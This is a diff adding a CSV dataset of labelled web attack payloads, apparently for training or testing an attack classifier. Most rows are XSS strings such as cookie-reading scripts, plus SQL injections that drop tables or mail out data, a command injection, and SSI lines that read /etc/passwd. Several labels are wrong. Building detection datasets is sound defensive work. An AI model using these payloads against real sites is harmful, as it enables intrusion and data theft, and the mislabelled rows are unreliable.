@@ -1,0 +1,65 @@
+,Payload,Attack Type
+0,<script>alert(1)</script> dfd login ,CROSS-SITE SCRIPTING (XSS)
+1,<script>alert(1)</script> sdsd login ,CROSS-SITE SCRIPTING (XSS)
+2,exampleuser <script>alert(1)</script> ,CROSS-SITE SCRIPTING (XSS)
+3,exampleuser <script>alert(1)</script> ,CROSS-SITE SCRIPTING (XSS)
+4,exampleuser <svg contentScriptType=text/vbs><script>MsgBox+1 ,CROSS-SITE SCRIPTING (XSS)
+5,exampleuser <svg contentScriptType=text/vbs><script>MsgBox+1 ,CROSS-SITE SCRIPTING (XSS)
+6,exampleuser <script>alert(1)</script> ,CROSS-SITE SCRIPTING (XSS)
+7,<script>alert(1)</script> jjjj login ,CROSS-SITE SCRIPTING (XSS)
+8,<script>alert(1)</script> sss login ,CROSS-SITE SCRIPTING (XSS)
+9,<script>alert(1)</script> ss login ,CROSS-SITE SCRIPTING (XSS)
+10,<script>destroyWebsite();</script> aaa login ,CROSS-SITE SCRIPTING (XSS)
+11,<script>destroyWebsite();</script> mmmm login ,CROSS-SITE SCRIPTING (XSS)
+12,<script>destroyWebsite();</script> Gokul login ,CROSS-SITE SCRIPTING (XSS)
+13,"string (password(),1,2)='10' fuiffeuiu login ",SQL INJECTION
+14,<script>alert('XSS')</script> ,CROSS-SITE SCRIPTING (XSS)
+15,<script>alert('XSS')</script> ,CROSS-SITE SCRIPTING (XSS)
+16,exampleuser <script>alert(1)</script> ,CROSS-SITE SCRIPTING (XSS)
+17,<script>alert(1)</script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+18,<script>alert(1)</script> jjj login ,CROSS-SITE SCRIPTING (XSS)
+19,<script>alert(1)</script> jjj login ,CROSS-SITE SCRIPTING (XSS)
+20,<script>destroyWebsite();</script> Gokul login ,CROSS-SITE SCRIPTING (XSS)
+21,<script>destroyWebsite();</script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+22,<script>destroyWebsite();</script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+23,<script>alert(1)</script> ggg login ,CROSS-SITE SCRIPTING (XSS)
+24,<script>destroyWebsite();</script> hhh login ,CROSS-SITE SCRIPTING (XSS)
+25,<script>destroyWebsite();</script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+26,<script>destroyWebsite();</script> hhhh login ,CROSS-SITE SCRIPTING (XSS)
+27,<script>destroyWebsite();</script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+28,<script>destroyWebsite();</script> Gokul login ,CROSS-SITE SCRIPTING (XSS)
+29,<script>destroyWebsite();</script> 11111 login ,CROSS-SITE SCRIPTING (XSS)
+30,<script>destroyWebsite();</script> kkkk login ,CROSS-SITE SCRIPTING (XSS)
+31,<script>destroyWebsite();</script> 1937 login ,CROSS-SITE SCRIPTING (XSS)
+32,<script>destroyWebsite();</script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+33,SELECT * FROM users WHERE username='johndoe'; DROP TABLE users; --' gokul login ,SQL INJECTION
+34,<script>destroyWebsite();</script> Gaps login ,CROSS-SITE SCRIPTING (XSS)
+35,<script>destroyWebsite();</script> oliu login ,CROSS-SITE SCRIPTING (XSS)
+36,SELECT * FROM users WHERE username='johndoe'; DROP TABLE users; --' gokul@0000 login ,SQL INJECTION
+37,<script>   alert('Outer script');   <script>alert('Inner script');</script> </script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+38,<img src=javascript&#x3a;alert(1)> Gokul login ,CROSS-SITE SCRIPTING (XSS)
+39,"<img src=""javascript:alert('XSS');""> gokul login ",CROSS-SITE SCRIPTING (XSS)
+40,"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",CROSS-SITE SCRIPTING (XSS)
+41,"<a href=""javascript:void(0)"" onclick=""alert('XSS')"">Click me</a> gokul login ",CROSS-SITE SCRIPTING (XSS)
+42,<script>   alert('Outer script');   <script>alert('Inner script');</script> </script> gokul login ,CROSS-SITE SCRIPTING (XSS)
+43,<img src=javascript&#x3a;alert(1)> gokul login ,CROSS-SITE SCRIPTING (XSS)
+44,"<img src=""javascript:alert('XSS');""> gokul login ",CROSS-SITE SCRIPTING (XSS)
+45,<script>alert(document.cookie)</script> ,CROSS-SITE SCRIPTING (XSS)
+46,<img src=javascript&#x3a;alert(1)> gokul login ,CROSS-SITE SCRIPTING (XSS)
+47,"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> gokul login ",CROSS-SITE SCRIPTING (XSS)
+48,SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 1 FROM nonexistent_table; gokul login ,SQL INJECTION
+49,SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 1 FROM users WHERE username = 'hacker' AND LENGTH(password) = 8; gokul login ,SQL INJECTION
+50,"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT IF(SLEEP(5), 1, 0) FROM users WHERE username = 'hacker'; gokul login ",SQL INJECTION
+51,"SELECT * FROM users WHERE username = 'admin'; EXEC master..xp_sendmail 'attacker@example.com', 'Test message', 'Test subject'; gokul login ",SQL INJECTION
+52,INSERT INTO comments (comment_text) VALUES ('This is a normal comment'); UPDATE users SET password = 'hacked' WHERE username = 'admin'; gokul login ,CROSS-SITE SCRIPTING (XSS)
+53,1' or '1' = '1 1' or '1' = '1 ,SQL INJECTION
+54,1' or '1' = '1'))/* foo ,SQL INJECTION
+55,10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )-- ,SQL INJECTION
+56,"""&& perl -e 'print """"X""""x4096' gokul login ",COMMAND INJECTION
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> jjj login ",CROSS-SITE SCRIPTING (XSS)
+"<iframe src=""data:text/html,<script>alert('XSS');</script>""></iframe> cccc login ",CROSS-SITE SCRIPTING (XSS)
+<img src=javascript&#x3a;alert(1)> sugav login ,CROSS-SITE SCRIPTING (XSS)
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; gokul login ,CROSS-SITE SCRIPTING (XSS)
+1' or '1' = '1 1' or '1' = '1 ,SQL INJECTION
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX iiii login ,CROSS-SITE SCRIPTING (XSS)
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; iiii login ,CROSS-SITE SCRIPTING (XSS)
